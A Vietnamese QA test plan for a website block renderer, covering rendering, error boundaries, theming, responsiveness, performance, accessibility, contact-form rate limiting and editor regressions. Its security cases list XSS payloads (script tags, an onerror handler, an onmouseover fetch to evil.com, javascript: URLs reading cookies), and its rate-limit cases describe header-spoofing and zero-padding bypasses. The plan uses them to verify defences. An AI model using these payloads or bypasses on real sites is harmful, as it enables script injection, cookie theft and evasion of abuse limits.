# Quyết Định Kiểm Thử & Kiểm Thử Chi Tiết: F04 - Block Renderer Engine
> **Phiên bản:** 1.0 | **Cập nhật:** 2026-04-06 | **Thực hiện:** QA Team
> **Nguồn Tham chiếu:** PRD (`F04-block-renderer.md`), Block Registry (`src/blocks/registry.ts`), SiteRenderer (`src/components/site-renderer/SiteRenderer.tsx`), Block Types (`src/blocks/types.ts`)
> **Kỹ năng ứng dụng (.agent):** BDD (Gherkin Expectations), Performance SLA Validators, Security XSS Sanitization, Accessibility WCAG 2.1 AA Auditing, Responsive Layout Healer.

---

## 1. Mục Tiêu (Objective)

Tài liệu này đảm bảo chất lượng toàn diện cho **Block Renderer Engine (F04)** — hệ thống lõi render 20 block types do AI tạo ra thành giao diện website hoàn chỉnh. Mục tiêu cốt lõi:

- **>99% render thành công** với config hợp lệ.
- **100% config không hợp lệ** bị bắt với fallback/error boundary, không crash.
- **Lighthouse Performance > 90**, render time **< 50ms/block**.
- **WCAG 2.1 AA** cho toàn bộ 20 block types.
- **Zero XSS** — sanitize toàn bộ user content trong blocks.

Bộ kiểm thử bao gồm **25 kịch bản chi tiết** bao quát: Happy path, Invalid config, Responsive, Performance, Security, Accessibility.

---

## 2. Test Environment (Môi trường Kiểm thử)

| Biến (Variable) | Yêu cầu (Requirements) |
|---|---|
| Môi trường (Env) | Staging / Localhost (force-dynamic mode, Docker standalone) |
| Browsers | Chrome (v110+), Firefox (v105+), Safari (Latest) |
| Devices (Responsive) | Desktop (1920x1080), Tablet (768x1024), Mobile (iPhone 14 Pro 375px) |
| Test Data & SLA | 20 block types registry, XSS payload vectors, Lighthouse CLI, render profiler < 50ms/block |
| Block Registry | navigation, hero, features, about, testimonials, faq, contact, gallery, footer, pricing, cta, stats, team, newsletter, video, logo-cloud, blog-list, products-grid, products-featured, custom-html |

---

## 3. Unified Test Cases (Traceability Matrix)

### NHÓM 1: Render Block Types — Happy Path (Valid Config)

| ID | Ref | Loại | Tiêu Đề | Các Bước Thực Hiện | Kết Quả Mong Đợi | Mức Độ | AUTO |
|:---|:---|:---|:---|:---|:---|:---:|:---:|
| **TC-F04.01** | `Registry` | `Func` | **[Positive]** Render Hero block với config hợp lệ | 1. Tạo page layout chứa hero block với đầy đủ props: title, subtitle, backgroundImage, CTA buttons.<br>2. Truy cập trang storefront. | - HeroBlock hiển thị đúng: tiêu đề, ảnh nền, CTA buttons.<br>- Không có console error.<br>- DOM output khớp variant default. | Blocker | [x] |
| **TC-F04.02** | `Registry` | `Func` | **[Positive]** Render toàn bộ 20 block types trong registry | 1. Tạo page layout chứa 20 block types (navigation, hero, features, about, testimonials, faq, contact, gallery, footer, pricing, cta, stats, team, newsletter, video, logo-cloud, blog-list, products-grid, products-featured, custom-html).<br>2. Render page qua SiteRenderer. | - Tất cả 20 blocks resolve qua `blockRegistry.getComponent()` không trả null.<br>- Tất cả 20 blocks render thành công (DOM > 0 elements mỗi block).<br>- `blockRegistry.count === 20`. | Blocker | [x] |
| **TC-F04.03** | `Registry` | `Func` | **[Positive]** Render Pricing block với 3 plans | 1. Config pricing block với 3 plans: Free, Pro, Enterprise — mỗi plan có features, giá, CTA.<br>2. Render page. | - 3 pricing cards hiển thị song song trên desktop.<br>- Mỗi card có tên plan, giá, danh sách features, nút CTA.<br>- Layout cân đối, không tràn. | High | [ ] |
| **TC-F04.04** | `Registry` | `Func` | **[Positive]** Render FAQ block với accordion 5 items | 1. Config FAQ block với 5 câu hỏi/trả lời.<br>2. Click vào câu hỏi đầu tiên. | - Câu trả lời expand với animation mượt.<br>- Chỉ 1 item mở tại 1 thời điểm.<br>- Các item còn lại tự collapse. | High | [ ] |
| **TC-F04.05** | `Registry` | `Func` | **[Positive]** Render Gallery block với 6 ảnh | 1. Config gallery block với 6 images có alt text.<br>2. Render và kiểm tra layout. | - Ảnh hiển thị dạng grid: 3 cột (desktop), 2 cột (tablet), 1 cột (mobile).<br>- Mỗi ảnh có thuộc tính `alt`.<br>- Lazy loading kích hoạt (`loading="lazy"`). | High | [ ] |
| **TC-F04.06** | `Registry` | `Func` | **[Positive]** Render Navigation block với menu + logo | 1. Config navigation: logo, 5 menu items, CTA button.<br>2. Render trên desktop và mobile. | - Desktop: logo trái, menu ngang, CTA phải.<br>- Mobile (375px): hamburger icon thay menu, tap mở mobile drawer. | High | [x] |
| **TC-F04.06b** | `AC-5` | `Logic` | **[Positive]** Điều hướng Block Variants và Fallback | 1. Inject Hero block với `variant: "split"`.<br>2. Inject Hero block với `variant: "unknown-variant"`. | - Variant `split`: hiển thị layout chia cột đúng.<br>- Variant không hợp lệ: tự fallback về `default` (centered layout), không crash. | Blocker | [ ] |
| **TC-F04.06c** | `AC-7` | `Data` | **[Positive]** Tương thích ngược với schema cũ (Backward Compatibility) | 1. Query một layout page cũ chưa có field `variant` hoặc thiếu schema mới.<br>2. Render qua SiteRenderer. | - Zod tự chêm default values vào các field thiếu.<br>- Trang cũ hiển thị không bị vỡ.<br>- Render khớp 100% so với trước refactor. | Critical | [ ] |

---

### NHÓM 2: Invalid Config & Error Boundary — Negative Cases

| ID | Ref | Loại | Tiêu Đề | Các Bước Thực Hiện | Kết Quả Mong Đợi | Mức Độ | AUTO |
|:---|:---|:---|:---|:---|:---|:---:|:---:|
| **TC-F04.07** | `AC-6` | `Logic` | **[Negative]** Block type không tồn tại trong registry | 1. Inject layout block với `blockType: "non-existent-block"`.<br>2. Render page qua SiteRenderer. | - SiteRenderer skip block đó silently (return null).<br>- Các block khác render bình thường.<br>- Không console error, không white screen. | Blocker | [x] |
| **TC-F04.08** | `Zod` | `Logic` | **[Negative]** Config thiếu required fields | 1. Gọi `blockRegistry.validate("hero", { blockType: "hero" })` — thiếu title, subtitle.<br>2. Render hero block với config thiếu. | - Validate trả về `{ success: false }` với message chỉ rõ field thiếu.<br>- Block render với giá trị default (Zod `.default()`) hoặc hiện fallback UI.<br>- Page không crash. | Blocker | [x] |
| **TC-F04.09** | `ErrorBoundary` | `Sec` | **[Negative]** Block component throw runtime error | 1. Mock 1 block component throw `Error("Test crash")` khi render.<br>2. Render page chứa block lỗi + 2 block bình thường. | - `BlockErrorBoundary` bắt lỗi, hiển thị fallback UI cho block đó.<br>- 2 blocks còn lại render bình thường 100%.<br>- Không white screen toàn page. | Blocker | [x] |
| **TC-F04.10** | `Registry` | `Logic` | **[Negative]** Layout array rỗng (0 blocks) | 1. Render SiteRenderer với `page.layout = []`.<br>2. Quan sát output. | - Trang hiển thị trống (chỉ có global styles, CSS variables).<br>- Không error, không crash.<br>- Background color đúng theo theme colorMode. | Medium | [x] |
| **TC-F04.11** | `Zod` | `Logic` | **[Negative]** Block config với data type sai | 1. Config stats block với `value: "not-a-number"` thay vì `value: 1500`.<br>2. Validate và render. | - Validate trả về `{ success: false }` với message "Expected number, received string".<br>- Block hiển thị fallback hoặc dùng giá trị default. | High | [ ] |
| **TC-F04.12** | `AC-6` | `Logic` | **[Negative]** Block thiếu property blockType | 1. Inject block object `{ title: "Hello" }` — không có `blockType`.<br>2. Render qua SiteRenderer. | - Block bị skip hoàn toàn.<br>- Không error, không ảnh hưởng các blocks khác. | High | [x] |

---

### NHÓM 3: Theme Integration & CSS Variables

| ID | Ref | Loại | Tiêu Đề | Các Bước Thực Hiện | Kết Quả Mong Đợi | Mức Độ | AUTO |
|:---|:---|:---|:---|:---|:---|:---:|:---:|
| **TC-F04.13** | `Theme` | `UI` | **[Positive]** Theme CSS variables áp dụng đúng cho tất cả blocks | 1. Cấu hình theme: `primaryColor: #ff6600`, `fontHeading: Poppins`, `colorMode: light`.<br>2. Render page với 5 blocks khác nhau. | - `:root` có đúng: `--brand-primary: #ff6600`, `--font-heading: 'Poppins'`.<br>- Background trắng (light mode).<br>- Heading dùng font Poppins, buttons dùng primaryColor. | High | [ ] |
| **TC-F04.14** | `Theme` | `UI` | **[Positive]** Dark mode vs Light mode | 1. Render layout với `colorMode: dark`.<br>2. Render lại với `colorMode: light`. | - Dark: `background: #09090b`, `color: #fafafa`.<br>- Light: `background: #ffffff`, `color: #09090b`.<br>- Contrast ratio >= 4.5:1 cho mọi text. | High | [ ] |

---

### NHÓM 4: Responsive Design

| ID | Ref | Loại | Tiêu Đề | Các Bước Thực Hiện | Kết Quả Mong Đợi | Mức Độ | AUTO |
|:---|:---|:---|:---|:---|:---|:---:|:---:|
| **TC-F04.15** | `Responsive` | `UI` | **[Positive]** Tất cả blocks responsive trên mobile 375px | 1. Render page với 10 block types.<br>2. Resize viewport xuống 375px. | - Không có horizontal scrollbar.<br>- Text không bị cắt.<br>- Images scale đúng tỷ lệ.<br>- Grid chuyển về 1-2 cột.<br>- Touch targets >= 44px. | Blocker | [ ] |
| **TC-F04.16** | `Responsive` | `UI` | **[Positive]** Testimonials block responsive 3-col → 1-col | 1. Config testimonials với 6 items.<br>2. Lần lượt kiểm tra ở Desktop, Tablet, Mobile. | - Desktop (≥1024px): 3 cột.<br>- Tablet (768px): 2 cột.<br>- Mobile (375px): 1 cột full-width, scroll dọc.<br>- Cards không overlap, spacing đều. | High | [ ] |

---

### NHÓM 5: Performance SLA

| ID | Ref | Loại | Tiêu Đề | Các Bước Thực Hiện | Kết Quả Mong Đợi | Mức Độ | AUTO |
|:---|:---|:---|:---|:---|:---|:---:|:---:|
| **TC-F04.17** | `Perf` | `SLA` | **[Positive]** Render time < 50ms mỗi block | 1. Chạy performance profiler: render 1 hero block 100 lần, đo average time.<br>2. Lặp lại cho pricing, testimonials, gallery. | - Average render time < 50ms mỗi block.<br>- P99 < 100ms.<br>- Không memory leak (heap size ổn định sau 100 iterations). | Critical | [x] |
| **TC-F04.18** | `Perf` | `SLA` | **[Positive]** Lighthouse Performance Score > 90 | 1. Render full page: navigation + hero + features + pricing + testimonials + FAQ + gallery + stats + CTA + footer.<br>2. Chạy Lighthouse audit. | - Performance Score > 90.<br>- LCP < 2.5s, CLS < 0.1, FID < 100ms.<br>- Không có render-blocking resources từ block components. | Critical | [ ] |
| **TC-F04.19** | `Perf` | `SLA` | **[Positive]** Lazy loading images trong Gallery và Hero | 1. Render gallery block với 12 ảnh nặng (> 500KB mỗi ảnh).<br>2. Quan sát Network tab khi load lần đầu. | - Chỉ 3-4 ảnh đầu (in-viewport) được tải.<br>- Ảnh dưới fold tải khi scroll gần tới (Intersection Observer).<br>- Attribute `loading="lazy"` có trên các `<img>` tags. | High | [ ] |

---

### NHÓM 6: Security — XSS & Content Sanitization

| ID | Ref | Loại | Tiêu Đề | Các Bước Thực Hiện | Kết Quả Mong Đợi | Mức Độ | AUTO |
|:---|:---|:---|:---|:---|:---|:---:|:---:|
| **TC-F04.20** | `Sec` | `XSS` | **[Negative]** Chống XSS injection trong block text content | 1. Config hero block: `title = <script>alert('xss')</script>Hacked`.<br>2. Config about block: `description = <img onerror="alert(1)" src="x">`.<br>3. Render page. | - Script tags bị stripped hoàn toàn.<br>- Event handlers (onerror, onclick) bị loại bỏ.<br>- Text hiển thị an toàn: "Hacked" (không có alert popup). | Blocker | [x] |
| **TC-F04.21** | `Sec` | `XSS` | **[Negative]** Chống XSS trong Custom HTML block | 1. Config custom-html block: `html = <div onmouseover='fetch("evil.com")'>Hover me</div>`.<br>2. Render page. | - Event handler `onmouseover` bị stripped.<br>- Chỉ safe HTML tags/attributes còn lại.<br>- Không gửi request đến external domain. | Blocker | [x] |
| **TC-F04.22** | `Sec` | `XSS` | **[Negative]** Chống injection qua image URL nguy hiểm | 1. Config gallery block: `image url = javascript:alert(document.cookie)`.<br>2. Config hero: `backgroundImage = data:text/html,<script>alert(1)</script>`. | - URL bị reject hoặc sanitize.<br>- Chỉ cho phép `http://`, `https://`, `data:image/*`.<br>- Protocol `javascript:` bị chặn 100%. | Blocker | [x] |

---

### NHÓM 7: Accessibility — WCAG 2.1 AA

| ID | Ref | Loại | Tiêu Đề | Các Bước Thực Hiện | Kết Quả Mong Đợi | Mức Độ | AUTO |
|:---|:---|:---|:---|:---|:---|:---:|:---:|
| **TC-F04.23** | `A11y` | `WCAG` | **[Positive]** Semantic HTML cho tất cả block types | 1. Render full page với 10 blocks.<br>2. Chạy axe-core accessibility audit. | - Zero critical violations.<br>- Navigation dùng `<nav>`, hero dùng `<section>` với heading hierarchy (h1 > h2 > h3).<br>- Footer dùng `<footer>`, images có `alt`, links có descriptive text. | High | [ ] |
| **TC-F04.24** | `A11y` | `WCAG` | **[Positive]** Keyboard navigation qua FAQ accordion và CTA buttons | 1. Tab qua page từ navigation tới footer.<br>2. Nhấn Enter trên FAQ item để expand.<br>3. Tab tới CTA button, nhấn Enter để activate. | - Focus outline hiện rõ trên mọi interactive element.<br>- FAQ expand/collapse bằng Enter/Space.<br>- Tab order logic (top → bottom, left → right).<br>- Không có focus trap. | High | [ ] |
| **TC-F04.25** | `A11y` | `WCAG` | **[Positive]** Color contrast ratio >= 4.5:1 | 1. Render page với dark theme (text `#fafafa` trên nền `#09090b`).<br>2. Render lại với light theme (text `#09090b` trên nền `#ffffff`).<br>3. Kiểm tra nút CTA primary. | - Body text contrast >= 4.5:1 (AA).<br>- Large text (heading) contrast >= 3:1.<br>- CTA button text trên primary color background >= 4.5:1. | High | [ ] |

---

### NHÓM 8: Logo Href Injection — Navigation Block URL Rewriting

| ID | Ref | Loại | Tiêu Đề | Các Bước Thực Hiện | Kết Quả Mong Đợi | Mức Độ | AUTO |
|:---|:---|:---|:---|:---|:---|:---:|:---:|
| **TC-F04-SR-07a** | `GH-1278` | `Func` | **[Positive]** Navigation block trong page.layout nhận _logoHref: "/" | 1. Render SiteRenderer với navigation block trong page.layout.<br>2. Capture block props. | - Block nhận `_logoHref: "/"` được inject bởi SiteRenderer.<br>- Logo link có thể được rewrite cho local dev context nếu cần. | High | [x] |
| **TC-F04-SR-07b** | `GH-1278` | `Func` | **[Positive]** Site.headerBlock cũng nhận _logoHref: "/" | 1. Render SiteRenderer với site.headerBlock navigation.<br>2. Capture block props từ headerBlock. | - HeaderBlock navigation nhận `_logoHref: "/"` được inject.<br>- Logo link consistent giữa page.layout và global header. | High | [x] |
| **TC-F04-SR-07c** | `GH-1278` | `Func` | **[Positive]** SiteRenderer in editor mode injects _logoHref pointing to preview URL | 1. Render SiteRenderer with `isEditor={true}`, `siteId="site-abc"`, and homepage page.<br>2. Capture navigation block props to verify _logoHref injection in editor mode. | - Navigation block receives `_logoHref: "/preview/site-abc?pageId=<homepage-id>"` pointing to preview URL.<br>- Logo click in editor navigates to page preview, not storefront homepage. | High | [x] |
| **TC-F04-SR-07d** | `GH-1278` | `Func` | **[Positive]** SiteRenderer in editor mode with no homepage → _logoHref = "#" (safe fallback) | 1. Render SiteRenderer with `isEditor={true}`, `siteId="site-abc"`, but no homepage page (only sub-pages like /about).<br>2. Capture navigation block props. | - Navigation block receives `_logoHref: "#"` as safe fallback when homepage not found.<br>- Logo click navigates nowhere (safe), preventing broken link. | High | [x] |

---

### NHÓM 9: Contact Form Submission — Rate-limiting & Honeypot

| ID | Ref | Loại | Tiêu Đề | Các Bước Thực Hiện | Kết Quả Mong Đợi | Mức Độ | AUTO |
|:---|:---|:---|:---|:---|:---|:---:|:---:|
| **TC-F04.CS.01** | `GH-1464` | `Func` | **[Positive]** Fresh siteId+IP → 200 success; rate-limit key scoped by site+IP | 1. POST /api/contact-submit với body hợp lệ, XFF=`1.1.1.1`, siteId='1'.<br>2. Assert response status và checkRateLimit call. | - Status 200, `{success:true}`.<br>- checkRateLimit gọi với key `contact-submit:1:1.1.1.1`.<br>- Submission được create thành công. | High | [x] |
| **TC-F04.CS.02** | `GH-1464` | `Func` | **[Positive]** Same siteId+IP submitted 6× → 6th returns 429 | 1. POST 6 requests với cùng siteId+IP (`1:2.2.2.2`).<br>2. Kiểm tra status code từ request thứ 1-6. | - Requests 1-5: 200 (success).<br>- Request 6: 429 với error "Too many submissions. Please try again in a few minutes."<br>- Rate-limit counter per key-window hoạt động đúng. | High | [x] |
| **TC-F04.CS.03** | `GH-1464` | `Func` | **[Positive]** Two siteIds same IP have independent counters | 1. POST siteId=101 5 lần với IP 3.3.3.3.<br>2. POST siteId=102 1 lần với IP 3.3.3.3.<br>3. Kiểm tra status code siteId=102. | - siteId=101: 5×200, 6×429 (hits limit).<br>- siteId=102: 1×200 (không affected by quota của 101).<br>- checkRateLimit calls với keys khác nhau: `contact-submit:101:...` vs `contact-submit:102:...`. | High | [x] |
| **TC-F04.CS.04** | `GH-1464` | `Func` | **[Negative]** Missing x-forwarded-for header → fail-open (no rate-limit) | 1. POST 6+ requests LIÊN TIẾP (no XFF header).<br>2. Assert status code và checkRateLimit call history. | - Tất cả requests: 200 (never 429).<br>- checkRateLimit NOT called (vì rawIp=undefined, skip guard).<br>- Submission được create với ipAddress='unknown'. | High | [x] |
| **TC-F04.CS.05** | `GH-1464` | `Logic` | **[Negative]** Invalid body (missing siteId) → 400; rate-limit not reached | 1. POST với body thiếu siteId field.<br>2. Assert response status. | - Status 400 với error message chỉ rõ field thiếu.<br>- checkRateLimit NOT called (validation happens first). | Medium | [x] |
| **TC-F04.CS.06** | `GH-1464` | `Logic` | **[Negative]** Honeypot field filled (website has value) → rejected by zod validation | 1. POST với website field điền: `website: "http://spammer.com"`.<br>2. Kiểm tra response và mock calls. | - Status **400** với error chứa "Spam detected" (zod `max(0)` reject trước khi route's honeypot check chạy tới — honeypot check ở route hiện là dead code, đã biết, không thuộc scope GH-1464).<br>- payload.create NOT called. | Medium | [x] |
| **TC-F04.CS.07** | `GH-1464` | `Security` | **[Negative]** Spoofed leftmost XFF entry bị bỏ qua; dùng rightmost (Vercel-appended) IP cho rate-limit key | 1. POST với XFF=`"9.9.9.9, 6.6.6.6"` (9.9.9.9 giả mạo, 6.6.6.6 thật — Vercel append).<br>2. Assert key gọi tới checkRateLimit. | - checkRateLimit gọi với `contact-submit:1:6.6.6.6`.<br>- KHÔNG có call nào chứa `9.9.9.9` (leftmost/spoofed value bị bỏ qua). | High | [x] |
| **TC-F04.CS.08** | `GH-1464` | `Security` | **[Positive]** x-real-ip header được ưu tiên hơn x-forwarded-for | 1. POST với cả `x-real-ip: "7.1.1.1"` và `x-forwarded-for: "8.8.8.8"`.<br>2. Assert key gọi tới checkRateLimit. | - checkRateLimit gọi với `contact-submit:1:7.1.1.1` (x-real-ip thắng x-forwarded-for). | Medium | [x] |
| **TC-F04.CS.09** | `GH-1464` | `Security` | **[Positive]** Nhiều siteId hợp lệ khác nhau từ 1 IP → KHÔNG bị chặn oan (regression cho kịch bản 200 người/200 site) | 1. POST 25 lần, mỗi lần siteId hợp lệ khác nhau (findByID resolve thật cho tất cả), cùng 1 IP.<br>2. Kiểm tra status code từng request. | - Cả 25 request: 200. Không có trần chung theo IP cho traffic hợp lệ — mỗi site chỉ bị giới hạn bởi layer per-site+IP (5/site) của chính nó. | High | [x] |
| **TC-F04.CS.10** | `GH-1464` | `Security` | **[Negative]** Dò siteId không tồn tại bị chặn theo IP: lần thứ 11 liên tiếp → 429 | 1. POST 11 lần, mỗi lần siteId (numeric, không tồn tại) khác nhau (findByID trả null), cùng 1 IP.<br>2. Kiểm tra status/error từng request. | - 10 lần đầu: 400 "Invalid site".<br>- Lần 11: 429 "Too many submissions..." (chặn bởi ceiling riêng `contact-submit-invalid-site-probe:${ip}`, 10/5phút — không ảnh hưởng traffic site hợp lệ). | High | [x] |
| **TC-F04.CS.11** | `GH-1464` | `Security` | **[Negative]** Thiếu IP + site không tồn tại → 400, không rate-limit ở layer nào (fail-open áp dụng cả 2 layer) | 1. POST không có x-forwarded-for/x-real-ip, siteId (numeric) không tồn tại (findByID trả null).<br>2. Assert response + checkRateLimit call. | - Status 400 "Invalid site" (không phải 429).<br>- checkRateLimit KHÔNG được gọi lần nào (cả layer per-site+IP và invalid-site-probe đều skip khi rawIp undefined). | High | [x] |
| **TC-F04.CS.12** | `GH-1464` | `Logic` | **[Negative]** Lỗi bất ngờ (payload.create throw) → 500, message generic | 1. Mock `payload.create` reject với Error.<br>2. POST body hợp lệ, assert response. | - Status 500, error "Something went wrong. Please try again." (không leak chi tiết lỗi nội bộ).<br>- Lỗi được log qua `console.error('[Contact Submit] Error:', ...)`. | Medium | [x] |
| **TC-F04.CS.13** | `GH-1464` | `Security` | **[Negative]** siteId không phải numeric string → 400 trước khi chạm rate-limit/DB (cost-amplification guard) | 1. POST với siteId dạng free-form (`"not-a-real-site-id"`).<br>2. Assert response + checkRateLimit call. | - Status 400, error "Invalid site ID" (zod regex `/^\d+$/` reject).<br>- checkRateLimit KHÔNG được gọi (chặn junk-key cardinality trên Upstash trước khi tốn Redis command). | Medium | [x] |
| **TC-F04.CS.14** | `GH-1464` | `Security` | **[Negative]** siteId đệm số 0 ở đầu (`"01"`) không được coi khác `"1"` — chặn bypass rate-limit qua zero-padding | 1. POST siteId=`"1"` rồi siteId=`"01"`, cùng 1 IP.<br>2. Assert cả 2 đều dùng chung 1 rate-limit key. | - Cả 2 request: 200.<br>- checkRateLimit gọi với key canonical `contact-submit:1:...` cho cả 2 (không có key `:01:` riêng) — Postgres cast `'01'::int = 1` nên dùng string thô sẽ tạo bucket riêng, cho phép attacker nhân N lần quota bằng cách đệm số 0. | High | [x] |
| **TC-F04.CS.15** | `GH-1464` | `Security` | **[Negative]** siteId vượt range Postgres int4 (21 chữ số) → 400 trước khi chạm rate-limit/DB | 1. POST siteId=`"99999999999999999999"` (qua được regex `/^\d+$/` nhưng overflow int4/safe-integer).<br>2. Assert response + checkRateLimit call. | - Status 400 "Invalid site ID".<br>- checkRateLimit KHÔNG được gọi (chặn trước khi giá trị tràn số hoặc gây lỗi DB bị nuốt bởi `.catch(() => null)` và hiểu nhầm thành probe). | Medium | [x] |
| **TC-F04.CS.16** | `GH-1464` | `Logic` | **[Negative]** siteId=`"0"` → 400 (không phải PK dương hợp lệ) | 1. POST siteId=`"0"`.<br>2. Assert response + checkRateLimit call. | - Status 400 "Invalid site ID".<br>- checkRateLimit KHÔNG được gọi. | Low | [x] |

---

## 4. Hành Trình E2E UAT Flow

| Bước | Hành Động | Kết Quả Mong Đợi |
|:---:|:---|:---|
| 1 | AI tạo landing page với 8 blocks (navigation, hero, features, gallery, testimonials, pricing, CTA, footer). | SiteRenderer render toàn bộ 8 blocks thành công trong < 400ms (TC-F04.01, 02, 17). |
| 2 | AI gen sai 1 block (thiếu required field). | BlockErrorBoundary bắt lỗi, hiện fallback. 7 blocks còn lại render bình thường, không white screen (TC-F04.08, 09). |
| 3 | User chuyển sang mobile preview 375px. | Tất cả blocks responsive: navigation → hamburger, gallery → 1 cột, pricing → stack dọc. Không horizontal scroll (TC-F04.15, 16). |
| 4 | QA inject XSS payload vào hero title qua AI chat. | Content bị sanitize, không có alert popup. Lighthouse audit > 90 (TC-F04.20, 21, 18). |
| 5 | Screen reader navigate full page bằng keyboard. | Tab order logic, heading hierarchy đúng, alt text đầy đủ. axe-core zero critical violations (TC-F04.23, 24, 25). |

---

## 5. Tiêu Chí Đánh Giá Chất Lượng Phát Hành (Quality Gates)

| Nhóm Kiểm Thử | Trạng Thái | Ghi Chú |
|---|---|---|
| **1. Block Coverage (20/20 types)** | [ ] 0/6 TC | Tất cả 20 block types trong registry phải render thành công. `blockRegistry.count === 20`. |
| **2. Error Boundary & Invalid Config** | [ ] 0/6 TC | 100% invalid configs bị catch. Không white screen. BlockErrorBoundary isolate lỗi per-block. |
| **3. Responsive (Desktop/Tablet/Mobile)** | [ ] 0/2 TC | Không horizontal scroll trên 375px. Grid layouts adaptive. Touch targets >= 44px. |
| **4. Performance SLA** | [ ] Not Run | Render < 50ms/block. Lighthouse > 90. Lazy loading images. No memory leak. |
| **5. Security (XSS Zero)** | [ ] Not Run | DOMPurify sanitize toàn bộ user content. `javascript:` protocol bị chặn. Custom HTML sandboxed. |
| **6. Accessibility WCAG 2.1 AA** | [ ] Not Run | axe-core zero critical. Keyboard navigable. Contrast >= 4.5:1. Semantic HTML. |
| **7. E2E UAT Approval** | [ ] Not Run | Full AI-gen → render → preview → publish flow hoạt động end-to-end. |

> **Khuyến Nghị Release:** Block Renderer Engine là hệ thống lõi — mọi trang web đều phụ thuộc vào nó. Yêu cầu **100% Blocker TCs pass** + **Lighthouse > 90** + **Zero XSS** trước khi release. Khuyến nghị chạy automated regression suite (12 TCs đánh dấu AUTO) mỗi PR merge.

---

## 6. GH-1367 Editor Toolbar & Text Selection (TC-EDIT-01..09)

**Scope:** Editor UI regression tests for Bug 1 (text-hit detection guard) + Bug 2 (light/dark theme toolbar). Mapped to Block Renderer feature family (F04 blocks are edited via this toolbar).

| TC-ID | Bug | Layer | Test File | Assertion |
|:---|:---|:---|:---|:---|
| **TC-EDIT-01** | Bug 1 | Unit (jsdom) | `src/__tests__/unit/editor/preview-scripts.test.tsx` | Background/padding click → NO `TEXT_EDITING_STARTED` message |
| **TC-EDIT-02** | Bug 1 | Unit (jsdom) | `src/__tests__/unit/editor/preview-scripts.test.tsx` | Heading text click → `TEXT_EDITING_STARTED` posted |
| **TC-EDIT-03** | Bug 1 | Unit (jsdom) | `src/__tests__/unit/editor/preview-scripts.test.tsx` | Padding wrapper around heading → NO text-edit toolbar |
| **TC-EDIT-04** | Bug 1 | Unit (jsdom) | `src/__tests__/unit/editor/preview-scripts.test.tsx` | Empty Logo Cloud block click → NO `TEXT_EDITING_STARTED` |
| **TC-EDIT-05** | Bug 1 | Unit (jsdom) | `src/__tests__/unit/editor/preview-scripts.test.tsx` | Newsletter: bg click (no edit) vs headline click (edit started) |
| **TC-EDIT-06** | Bug 2 | Unit (RTL) | `src/__tests__/unit/editor/block-action-bar.test.tsx` | Toolbar uses a consistent dark pill `bg-[#334155]/98` (both themes) + `.block-action-toolbar` opt-out marker |
| **TC-EDIT-07** | Bug 2 | Unit (RTL) | `src/__tests__/unit/editor/block-action-bar.test.tsx` | Single dark-pill surface drives both modes; icon base classes preserved (amber-300 AI, red-400 delete) |
| **TC-EDIT-08** | Bug 2 | Unit (RTL) | `src/__tests__/unit/editor/block-action-bar.test.tsx` | Action buttons include `hover:bg-white/10` class (hover state) |
| **TC-EDIT-09** | Bug 2 | Unit (RTL) | `src/__tests__/unit/editor/block-action-bar.test.tsx` | Drag grip button present & `onDragStart` fires on pointerDown |

**Root Causes & Fixes:**
- **Bug 1 (GH-1367)**: `PreviewScripts.tsx` added `clickLandedOnTextNode(x,y)` guard (lines 315–331) — uses `document.caretRangeFromPoint` (Chrome) or `caretPositionFromPoint` (Firefox) to detect text node vs element node. Background/padding clicks return false; text hits return true.
- **Bug 2 (GH-1367)**: `BlockActionBar.tsx` uses a single dark pill (`bg-[#334155]/98` + `border-white/30` + light 1px ring + drop shadow) in BOTH editor themes so it stays identifiable floating over any website content (white or dark). Icons stay light (`text-slate-300/400`, `amber-300`, `red-400`). In light mode the editor-shell remap would darken those, so scoped `.block-action-toolbar` rules in `globals.css` re-assert the dark-theme values (slate `#94a3b8`, AI `#fcd34d`, delete `#f87171`, white-tint dividers/hover) so light renders identically to dark.

**Test Coverage Strategy:**
- TC-EDIT-01..05: Mock `caretRangeFromPoint` per test case to simulate text vs background hits. Assert postMessage type.
- TC-EDIT-06..09: Render real `BlockActionBar` component; query className strings + simulate pointerDown on grip button.
- All tests: No fake data, import real components, follow AAA pattern.

---

## 7. GH-1461 Builder-Preview Read-Only Enforcement (TC-GH1461-01..05, TC-GH1461-WA-01..02)

**Scope:** AI Builder read-only preview screens (`?builder=1`, non-editor) must disable all edit affordances (Change Image overlay, WhatsApp/cart click) while leaving the real editor and storefront untouched. Mapped to Block Renderer feature family (`SiteRenderer.tsx` provides the context both editor and preview consume).

| TC-ID | Layer | Test File | Assertion |
|:---|:---|:---|:---|
| **TC-GH1461-01** | Unit (RTL) | `src/__tests__/unit/site-renderer/f05-site-renderer.test.tsx` | `useIsBuilderPreview()` returns `true` inside a block when `SiteRenderer` receives `isBuilderPreview={true}` |
| **TC-GH1461-02** | Unit (RTL) | `src/__tests__/unit/site-renderer/f05-site-renderer.test.tsx` | `useIsBuilderPreview()` returns `false` when `isBuilderPreview={false}` (real editor) |
| **TC-GH1461-03** | Unit (RTL) | `src/__tests__/unit/site-renderer/f05-site-renderer.test.tsx` | `useIsBuilderPreview()` defaults to `false` when the prop is omitted (storefront) |
| **TC-GH1461-04** | Unit (RTL) | `src/__tests__/unit/site-renderer/f05-site-renderer.test.tsx` | `useBlockEditCallback()` resolves to `null` when `isBuilderPreview={true}`, even with a real `onBlockFieldChange` provided — locks the single-source-of-truth invariant the fix depends on |
| **TC-GH1461-05** | Unit (RTL) | `src/__tests__/unit/site-renderer/f05-site-renderer.test.tsx` | `useBlockEditCallback()` resolves to a real callback when `isBuilderPreview={false}`, same `onBlockFieldChange` input |
| **TC-GH1461-WA-01** | Unit (RTL) | `src/__tests__/unit/blocks/whatsapp-button.test.tsx` | callback=null (builder-preview/storefront) → anchor has no `onclick` handler, real navigation not suppressed |
| **TC-GH1461-WA-02** | Unit (RTL) | `src/__tests__/unit/blocks/whatsapp-button.test.tsx` | callback present (real editor) → click is prevented so it doesn't navigate away from the editor canvas |

Also see **TC-F30-HMO-013** (`docs/qa/F30-hero-media-overlay.md`) — same GH-1461 invariant verified at the `HeroMediaOverlay` component level.

